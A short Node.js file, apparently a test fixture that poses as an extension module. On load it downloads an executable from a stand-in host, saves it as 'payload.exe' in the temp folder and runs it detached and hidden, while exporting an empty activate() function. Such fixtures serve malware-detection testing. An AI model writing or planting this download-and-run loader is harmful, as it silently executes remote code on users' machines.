const http = require('http');
const fs = require('./mock-fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');
const url = 'http://downloads.example.test/bin/tool.exe';
const file = path.join(os.tmpdir(), 'payload.exe');
http.get(url, response => response.pipe(fs.createWriteStream(file)).on('finish', () => {
  spawn(file, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
}));
module.exports = { activate() {} };
